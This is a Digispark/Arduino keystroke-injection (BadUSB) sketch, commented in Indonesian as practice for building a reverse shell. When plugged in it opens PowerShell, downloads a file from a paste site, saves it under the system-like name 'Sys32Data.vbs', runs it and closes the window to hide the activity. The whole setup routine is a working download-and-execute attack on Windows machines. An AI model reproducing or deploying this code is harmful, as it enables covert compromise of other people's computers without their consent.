#include "DigiKeyboard.h"

void setup() {
  // latihan membuat reverse shell
   int d=3000;
   DigiKeyboard.delay(5000);
   DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimize all windows
   DigiKeyboard.delay(d);
   DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);//open windows start
   DigiKeyboard.delay(d);
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(d);
   DigiKeyboard.print("$client = new-object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(d);
   DigiKeyboard.print("$client.DownloadFile('https://wtools.io/paste-code/bKIH','Sys32Data.vbs')");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("start Sys32Data.vbs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
   DigiKeyboard.delay(50000);
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  //DigiKeyboard.sendKeyStroke(0);
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  //DigiKeyboard.println("Hello Digispark!");
  
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  //DigiKeyboard.delay(5000);
}
